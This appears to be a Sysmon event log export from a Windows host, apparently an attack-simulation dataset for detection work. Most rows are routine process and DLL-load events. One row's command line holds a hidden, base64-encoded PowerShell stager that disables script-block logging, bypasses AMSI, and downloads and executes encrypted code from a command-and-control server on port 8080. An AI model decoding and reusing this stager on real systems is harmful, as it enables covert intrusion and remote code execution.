,UtcTime,ProcessId,EventID,User,Image,ImageLoaded,CommandLine,ParentImage,ParentCommandLine,DestinationPort,Protocol,QueryName,TargetFilename,TargetObject
657,2020-05-12 15:01:53.872,8216,7,,C:\Windows\System32\NETSTAT.EXE,C:\Windows\System32\inetmib1.dll,,,,,,,,
658,2020-05-12 15:01:53.888,1936,11,,C:\Windows\system32\svchost.exe,,,,,,,,C:\Windows\Prefetch\NETSTAT.EXE-47804A0C.pf,
660,2020-05-12 15:01:53.857,8216,7,,C:\Windows\System32\NETSTAT.EXE,C:\Windows\System32\snmpapi.dll,,,,,,,,
661,2020-05-12 15:01:53.872,8216,7,,C:\Windows\System32\NETSTAT.EXE,C:\Windows\System32\mswsock.dll,,,,,,,,
662,2020-05-12 15:01:53.857,8216,7,,C:\Windows\System32\NETSTAT.EXE,C:\Windows\System32\nsi.dll,,,,,,,,
663,2020-05-12 15:01:53.857,8216,7,,C:\Windows\System32\NETSTAT.EXE,C:\Windows\System32\IPHLPAPI.DLL,,,,,,,,
664,2020-05-12 15:01:53.857,8216,7,,C:\Windows\System32\NETSTAT.EXE,C:\Windows\System32\rpcrt4.dll,,,,,,,,
665,2020-05-12 15:01:53.857,8216,7,,C:\Windows\System32\NETSTAT.EXE,C:\Windows\System32\ws2_32.dll,,,,,,,,
666,2020-05-12 15:01:53.857,8216,7,,C:\Windows\System32\NETSTAT.EXE,C:\Windows\System32\msvcrt.dll,,,,,,,,
667,2020-05-12 15:01:53.841,8216,7,,C:\Windows\System32\NETSTAT.EXE,C:\Windows\System32\NETSTAT.EXE,,,,,,,,
668,2020-05-12 15:01:53.857,8216,7,,C:\Windows\System32\NETSTAT.EXE,C:\Windows\System32\KernelBase.dll,,,,,,,,
669,2020-05-12 15:01:53.857,8216,7,,C:\Windows\System32\NETSTAT.EXE,C:\Windows\System32\kernel32.dll,,,,,,,,
670,2020-05-12 15:01:53.841,8216,7,,C:\Windows\System32\NETSTAT.EXE,C:\Windows\System32\ntdll.dll,,,,,,,,
671,2020-05-12 15:01:53.849,8216,1,DESKTOP-TATBGQH\anon,C:\Windows\System32\NETSTAT.EXE,,"""C:\Windows\system32\NETSTAT.EXE"" -ano",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoP -NonI -W Hidden -enc SQBmACgAJABQAFMAVgBFAFIAcwBJAE8ATgBUAGEAQgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAcwBTAEUAbQBCAEwAeQAuAEcARQBUAFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAVABGAGkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBmACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAEEATAB1AGUAKAAkAG4AVQBMAGwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAFYAQQBsAD0AWwBDAG8AbABsAGUAQwB0AGkAbwBuAHMALgBHAGUATgBFAFIASQBjAC4ARABJAGMAVABJAE8AbgBhAHIAWQBbAFMAVABSAGkAbgBnACwAUwB5AFMAVABFAG0ALgBPAEIAagBlAGMAdABdAF0AOgA6AG4ARQB3ACgAKQA7ACQAdgBhAEwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAdgBBAEwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAEEATAB9AEUATABTAEUAewBbAFMAQwBSAEkAcAB0AEIATABvAEMAawBdAC4AIgBHAGUAVABGAGkARQBgAEwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBhAGwAVQBlACgAJABOAFUATABMACwAKABOAEUAVwAtAE8AQgBqAGUAQwBUACAAQwBvAGwAbABFAEMAVABpAE8AbgBTAC4ARwBlAG4AZQBSAEkAQwAuAEgAQQBzAEgAUwBFAHQAWwBzAHQAUgBJAE4AZwBdACkAKQB9AFsAUgBlAEYAXQAuAEEAUwBTAEUAbQBiAGwAeQAuAEcARQBUAFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBlAFQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAGEAbAB1AEUAKAAkAE4AVQBsAEwALAAkAFQAcgBVAGUAKQB9ADsAfQA7AFsAUwBZAFMAdABlAG0ALgBOAEUAVAAuAFMAZQBSAFYASQBjAEUAUABvAGkAbgB0AE0AYQBOAEEAZwBFAHIAXQA6ADoARQBYAFAAZQBjAHQAMQAwADAAQwBvAE4AVABpAE4AdQBlAD0AMAA7ACQAdwBjAD0ATgBFAFcALQBPAGIASgBlAGMAVAAgAFMAeQBTAFQAZQBtAC4ATgBlAFQALgBXAGUAYgBDAGwAaQBlAG4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAFcAYwAuAEgAZQBhAGQARQBSAHMALgBBAEQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAYwAuAFAAUgBPAFgAeQA9AFsAUwB5AHMAVABlAG0ALgBOAEUAdAAuAFcARQBiAFIAZQBRAHUARQBzAFQAXQA6ADoARABlAGYAQQB1AGwAdABXAEUAQgBQAFIATwB4AHkAOwAkAFcAYwAuAFAAUgBvAFgAeQAuAEMAUgBlAGQAZQBOAFQASQBBAEwAcwAgAD0AIABbAFMAeQBzAFQARQBtAC4ATgBFAFQALgBDAHIAZQBkAEUAbgBUAGkAQQBMAEMAQQBDAGgAZQBdADoAOgBEAGUAZgBhAHUATABUAE4ARQBUAHcATwBSAEsAQwByAEUAZABFAE4AdABpAEEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAFMAdABlAE0ALgBUAEUAWABUAC4ARQBOAGMAbwBEAGkATgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAWQB0AGUAUwAoACcARAAqADEAQQA1ADsASwBmAHQAXgB7AHMASgA4AGwAQABSAF8APABaAG4ASQBkADcAPgB+AEIANgBFAFMAbwBlACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABPAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMgA0AC4AMQAzADUAOgA4ADAAOAAwACcAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAHcAQwAuAEgAZQBhAGQAZQBSAFMALgBBAEQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAcwBlAHMAcwBpAG8AbgA9AFMATQBMAFgAVwBRAGIAaQBFADMAWgAvAE4ARABHAHEATAB1ADgAVAA5AEUAdABCAHIARABRAD0AIgApADsAJABEAEEAdABhAD0AJABXAEMALgBEAE8AVwBuAGwAbwBBAEQARABhAFQAQQAoACQAUwBFAHIAKwAkAHQAKQA7ACQASQBWAD0AJABEAGEAVABBAFsAMAAuAC4AMwBdADsAJABkAGEAdABBAD0AJABkAEEAdABBAFsANAAuAC4AJABkAEEAVABhAC4AbABFAE4AZwB0AEgAXQA7AC0AagBvAGkAbgBbAEMAaABhAFIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAVABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=",,,,,
672,2020-05-12 15:01:53.435,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\vsstrace.dll,,,,,,,,
673,2020-05-12 15:01:53.419,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\vssapi.dll,,,,,,,,
674,2020-05-12 15:01:53.404,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\spp.dll,,,,,,,,
675,2020-05-12 15:01:53.404,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\srclient.dll,,,,,,,,
676,2020-05-12 15:01:53.404,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\drupdate.dll,,,,,,,,
677,2020-05-12 15:01:53.388,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\wcp.dll,,,,,,,,
678,2020-05-12 15:01:53.435,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\ws2_32.dll,,,,,,,,
679,2020-05-12 15:01:53.404,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\umpdc.dll,,,,,,,,
680,2020-05-12 15:01:53.404,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\powrprof.dll,,,,,,,,
681,2020-05-12 15:01:53.404,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\user32.dll,,,,,,,,
682,2020-05-12 15:01:53.404,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\gdi32full.dll,,,,,,,,
683,2020-05-12 15:01:53.404,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\win32u.dll,,,,,,,,
684,2020-05-12 15:01:53.404,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\gdi32.dll,,,,,,,,
685,2020-05-12 15:01:53.404,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\ole32.dll,,,,,,,,
686,2020-05-12 15:01:53.404,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\cfgmgr32.dll,,,,,,,,
687,2020-05-12 15:01:53.342,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\dpx.dll,,,,,,,,
688,2020-05-12 15:01:53.326,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\wintrust.dll,,,,,,,,
689,2020-05-12 15:01:53.326,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\ntmarta.dll,,,,,,,,
690,2020-05-12 15:01:53.326,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\CbsCore.dll,,,,,,,,
691,2020-05-12 15:01:53.326,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\bcrypt.dll,,,,,,,,
692,2020-05-12 15:01:53.326,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\profapi.dll,,,,,,,,
693,2020-05-12 15:01:53.326,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\msasn1.dll,,,,,,,,
694,2020-05-12 15:01:53.326,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\userenv.dll,,,,,,,,
695,2020-05-12 15:01:53.326,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\crypt32.dll,,,,,,,,
696,2020-05-12 15:01:53.326,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\cryptsp.dll,,,,,,,,
697,2020-05-12 15:01:53.326,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\advapi32.dll,,,,,,,,
698,2020-05-12 15:01:53.295,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\servicing\CbsApi.dll,,,,,,,,
699,2020-05-12 15:01:53.295,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\clbcatq.dll,,,,,,,,
700,2020-05-12 15:01:53.279,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\kernel.appcore.dll,,,,,,,,
701,2020-05-12 15:01:53.279,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\dbgcore.dll,,,,,,,,
702,2020-05-12 15:01:53.279,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\dbghelp.dll,,,,,,,,
703,2020-05-12 15:01:53.263,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,,,,,,,,
704,2020-05-12 15:01:53.279,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\msvcp_win.dll,,,,,,,,
705,2020-05-12 15:01:53.279,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\oleaut32.dll,,,,,,,,
706,2020-05-12 15:01:53.279,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\msvcrt.dll,,,,,,,,
707,2020-05-12 15:01:53.279,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\wdscore.dll,,,,,,,,
708,2020-05-12 15:01:53.279,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\sechost.dll,,,,,,,,
709,2020-05-12 15:01:53.279,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\bcryptprimitives.dll,,,,,,,,
710,2020-05-12 15:01:53.279,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\rpcrt4.dll,,,,,,,,
711,2020-05-12 15:01:53.263,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\combase.dll,,,,,,,,
712,2020-05-12 15:01:53.263,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\ucrtbase.dll,,,,,,,,
713,2020-05-12 15:01:53.248,2720,7,,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\servicing\CbsApi.dll,,,,,,,,
714,2020-05-12 15:01:53.248,5800,7,,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\servicing\CbsApi.dll,,,,,,,,
715,2020-05-12 15:01:53.263,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\KernelBase.dll,,,,,,,,
716,2020-05-12 15:01:53.263,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\kernel32.dll,,,,,,,,
717,2020-05-12 15:01:53.263,2920,7,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,C:\Windows\System32\ntdll.dll,,,,,,,,
718,2020-05-12 15:01:53.248,2720,7,,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\System32\sysntfy.dll,,,,,,,,
719,2020-05-12 15:01:53.258,2920,1,NT AUTHORITY\SYSTEM,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe,,C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\TiWorker.exe -Embedding,C:\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k DcomLaunch -p,,,,,
720,2020-05-12 15:01:53.232,2720,7,,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\System32\clbcatq.dll,,,,,,,,
721,2020-05-12 15:01:53.248,672,13,,C:\Windows\system32\services.exe,,,,,,,,,HKLM\System\CurrentControlSet\Services\TrustedInstaller\Start
722,2020-05-12 15:01:53.232,2720,13,,C:\Windows\servicing\TrustedInstaller.exe,,,,,,,,,HKLM\System\CurrentControlSet\Control\Winlogon\Notifications\Components\TrustedInstaller\Events
723,2020-05-12 15:01:53.232,2720,7,,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\System32\gdi32full.dll,,,,,,,,
724,2020-05-12 15:01:53.232,2720,7,,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\System32\gdi32.dll,,,,,,,,
725,2020-05-12 15:01:53.232,2720,7,,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\System32\win32u.dll,,,,,,,,
726,2020-05-12 15:01:53.232,2720,7,,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\System32\user32.dll,,,,,,,,
727,2020-05-12 15:01:53.216,2720,7,,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\System32\kernel.appcore.dll,,,,,,,,
728,2020-05-12 15:01:53.216,2720,7,,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3\wdscore.dll,,,,,,,,
729,2020-05-12 15:01:53.216,2720,7,,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\System32\dbgcore.dll,,,,,,,,
730,2020-05-12 15:01:53.216,2720,7,,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\System32\dbghelp.dll,,,,,,,,
731,2020-05-12 15:01:53.216,2720,7,,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\System32\msvcp_win.dll,,,,,,,,
732,2020-05-12 15:01:53.216,2720,7,,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\System32\oleaut32.dll,,,,,,,,
733,2020-05-12 15:01:53.185,2720,7,,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\servicing\TrustedInstaller.exe,,,,,,,,
734,2020-05-12 15:01:53.201,2720,7,,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\System32\msvcrt.dll,,,,,,,,
735,2020-05-12 15:01:53.201,2720,7,,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\System32\advapi32.dll,,,,,,,,
736,2020-05-12 15:01:53.201,2720,7,,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\System32\sechost.dll,,,,,,,,
737,2020-05-12 15:01:53.201,2720,7,,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\System32\bcryptprimitives.dll,,,,,,,,
738,2020-05-12 15:01:53.201,2720,7,,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\System32\rpcrt4.dll,,,,,,,,
739,2020-05-12 15:01:53.201,2720,7,,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\System32\combase.dll,,,,,,,,
740,2020-05-12 15:01:53.201,2720,7,,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\System32\ucrtbase.dll,,,,,,,,
741,2020-05-12 15:01:53.201,2720,7,,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\System32\KernelBase.dll,,,,,,,,
742,2020-05-12 15:01:53.201,2720,7,,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\System32\kernel32.dll,,,,,,,,
743,2020-05-12 15:01:53.185,2720,7,,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\System32\ntdll.dll,,,,,,,,
744,2020-05-12 15:01:53.196,2720,1,NT AUTHORITY\SYSTEM,C:\Windows\servicing\TrustedInstaller.exe,,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,,,,,
745,2020-05-12 15:01:50.073,5800,22,,C:\Windows\System32\wbem\WmiPrvSE.exe,,,,,,,DESKTOP-TATBGQH,,
746,2020-05-12 15:01:49.563,1520,3,DESKTOP-TATBGQH\anon,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,8080,tcp,,,
